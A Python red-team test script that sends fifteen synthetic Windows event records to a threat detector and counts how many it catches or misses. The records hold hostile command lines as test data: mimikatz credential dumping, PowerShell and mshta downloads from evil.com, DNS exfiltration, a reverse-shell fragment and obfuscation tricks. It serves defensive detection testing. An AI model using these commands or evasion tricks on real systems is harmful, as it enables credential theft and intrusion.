"""Red Team test: bypass detection (v2 - after hardening)"""
import asyncio
# Reset singletons for fresh state
import app.services.ml_detector as md
md._detector = None
import app.services.event_processor as ep
ep._processor = None

from app.services.event_processor import get_event_processor
processor = get_event_processor()

tests = [
    ("1. Plain mimikatz", {
        "event_id": 4688, "channel": "Security", "process_name": "mimikatz.exe",
        "command_line": "mimikatz.exe sekurlsa::logonpasswords",
        "user": "admin", "hostname": "DC01"
    }),
    ("2. Unicode mimikatz", {
        "event_id": 4688, "channel": "Security", "process_name": "explorer.exe",
        "command_line": "mim\u0131katz sekurl\u0455a::logonpasswords",
        "user": "admin", "hostname": "DC01"
    }),
    ("3. PowerShell encoded", {
        "event_id": 4688, "channel": "Security", "process_name": "powershell.exe",
        "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
        "user": "user1", "hostname": "WS01"
    }),
    ("4. PS evasion (quotes)", {
        "event_id": 4688, "channel": "Security", "process_name": "explorer.exe",
        "command_line": 'p"o"w"e"r"s"h"e"l"l -c (New-Object Net.WebClient).DownloadString("http://evil.com")',
        "user": "user1", "hostname": "WS01"
    }),
    ("5. DNS exfiltration", {
        "event_id": 22, "channel": "Sysmon", "process_name": "svchost.exe",
        "command_line": "svchost.exe -k netsvcs",
        "user": "NETWORK SERVICE", "hostname": "WS02",
        "query_name": "data.c3VwZXJzZWNyZXQ.evil.com"
    }),
    ("6. DLL sideloading", {
        "event_id": 7, "channel": "Sysmon", "process_name": "notepad.exe",
        "command_line": "notepad.exe",
        "image_loaded": "C:/Users/Public/Downloads/version.dll",
        "user": "user4", "hostname": "WS07", "signed": False
    }),
    ("7. Python reverse shell", {
        "event_id": 4688, "channel": "Security", "process_name": "python.exe",
        "command_line": "python.exe -c import socket,subprocess,os;s=socket.socket();s.connect((chr(49)+chr(48),4444))",
        "user": "dev", "hostname": "DEV01"
    }),
    ("8. Sched task persist", {
        "event_id": 4698, "channel": "Security", "process_name": "schtasks.exe",
        "command_line": "schtasks /create /sc onstart /tn WindowsUpdate /tr update.bat /ru SYSTEM",
        "user": "admin", "hostname": "SRV01"
    }),
    ("9. WMI lateral movement", {
        "event_id": 1, "channel": "Sysmon", "process_name": "wmiprvse.exe",
        "command_line": "wmiprvse.exe -secured -Embedding",
        "parent_image": "svchost.exe", "user": "SYSTEM", "hostname": "WS03"
    }),
    ("10. Env var evasion", {
        "event_id": 4688, "channel": "Security", "process_name": "cmd.exe",
        "command_line": "cmd /c set x=powers&set y=hell&call %x%%y% -enc BASE64",
        "user": "user2", "hostname": "WS02"
    }),
    ("11. Renamed binary", {
        "event_id": 4688, "channel": "Security", "process_name": "svchost.exe",
        "command_line": "svchost.exe",
        "original_filename": "mimikatz.exe",
        "user": "admin", "hostname": "DC01"
    }),
    ("12. Fileless malware", {
        "event_id": 4104, "channel": "PowerShell", "process_name": "powershell.exe",
        "script_block_text": "[Reflection.Assembly]::Load([Convert]::FromBase64String($payload)).EntryPoint.Invoke($null,$null)",
        "user": "admin", "hostname": "WS08"
    }),
    ("13. LOLBAS mshta", {
        "event_id": 4688, "channel": "Security", "process_name": "mshta.exe",
        "command_line": "mshta javascript:a=GetObject('script:http://evil.com/payload.sct').Exec()",
        "user": "user5", "hostname": "WS09"
    }),
    ("14. Clean looking C2", {
        "event_id": 3, "channel": "Sysmon", "process_name": "chrome.exe",
        "command_line": "chrome.exe",
        "destination_ip": "185.199.108.153", "destination_port": 443,
        "user": "user6", "hostname": "WS10"
    }),
    ("15. Token theft (no keywords)", {
        "event_id": 4648, "channel": "Security", "process_name": "lsass.exe",
        "command_line": "",
        "user": "SYSTEM", "hostname": "DC01",
        "logon_type": 9, "source_ip": "10.0.0.50"
    }),
]

async def run():
    print(f"{'Test':<35} {'Result':<12} {'Confidence':<12} {'Reason'}")
    print("=" * 110)
    bypassed = 0
    caught = 0
    for name, event in tests:
        result = await processor.classify_and_forward(event)
        status = result.get("status", "?")
        confidence = result.get("confidence", result.get("ml_confidence", 0))
        reason = result.get("reason", result.get("ml_reason", "N/A"))
        if status == "filtered":
            tag = "MISSED"
            bypassed += 1
        else:
            tag = "CAUGHT"
            caught += 1
        print(f"{name:<35} {tag:<12} {confidence:<12.1%} {reason[:55]}")

    print("=" * 110)
    print(f"CAUGHT: {caught}/{len(tests)} | BYPASSED: {bypassed}/{len(tests)} | Evasion rate: {bypassed/len(tests)*100:.0f}%")

asyncio.run(run())
